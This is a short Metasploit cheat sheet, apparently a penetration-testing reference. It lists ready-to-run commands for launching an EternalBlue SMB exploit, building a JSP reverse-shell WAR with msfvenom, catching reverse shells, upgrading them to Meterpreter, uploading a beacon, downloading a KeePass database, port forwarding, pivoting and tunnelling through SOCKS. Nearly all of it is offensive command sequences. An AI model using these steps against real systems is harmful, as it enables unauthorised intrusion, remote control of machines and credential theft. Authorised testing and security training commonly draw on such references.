# Metasploit Framework

## Start Metasploit, search & use exploit:

```
# msfconsole
msf > search eternalblue
msf > use exploit/windows/smb/ms17_…
msf exploit(…) > show options
msf exploit(…) > set TARGET 100.76.2.3
msf exploit(…) > exploit
```

## Generate reverse shell (WAR):

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=443 -f war > sh.war
```

## Reverse shell listener:

```
msf > use exploit/multi/handler
msf > set payload linux/x64/shell_reverse_tcp
msf > set LHOST 100.76.2.3 # attacker
msf > set LPORT 443
msf > exploit
```

## Upgrade to Meterpreter:

```
background # or press Ctrl-Z ^Z
background session 1? [y/N] y
msf > sessions # list sessions
msf > sessions -u 1 # upgrade
msf > sessions 2 # interact
meterpreter > sysinfo # use it
```

## File exchange / execute binary:

```
meterpreter > upload beacon.exe
meterpreter > download c:\keepass.kdb
meterpreter > execute -i -f /your/bin
```

## Port forwarding to localhost:

```
meterpreter > portfwd add -l 2323 -p 3389 -r 10.5.23.23
```

## Background Meterpreter session:

```
meterpreter > background
```

## Pivoting through existing Meterpreter session:

```
msf > use post/multi/manage/autoroute
msf > set session 2 # meterpreter session
msf > run
msf > route
```

## SOCKS via Meterpreter (requires autoroute):

```
msf > use auxiliary/server/socks4a
msf > set SRVPORT 8080
msf > run
```

## Configure ProxyChains:

```
# vi /etc/proxychains.conf
[...]
socks4 127.0.0.1 1080
```

## Connect through SOCKS proxy:

```
# proxychains ncat 172.23.5.42 2305
```
